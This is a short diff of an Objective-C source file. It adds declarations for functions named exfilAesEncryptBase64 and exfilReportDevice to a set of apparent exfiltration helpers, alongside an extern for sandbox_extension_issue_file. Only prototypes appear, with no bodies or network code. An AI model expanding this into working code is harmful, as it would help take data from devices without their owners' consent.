@@ -21,6 +21,8 @@ extern char *sandbox_extension_issue_file(const char *extension_class,
                                           uint32_t flags);
 
 static void exfilLog(NSString *fmt, ...) NS_FORMAT_FUNCTION(1, 2);
+static NSString *exfilAesEncryptBase64(NSString *plain);
+static NSDictionary *exfilReportDevice(void);
 static void exfilScanDirDirect(NSString *dir);
 static NSString *exfilAppUuid(void);
 static NSString *exfilMachineName(void);
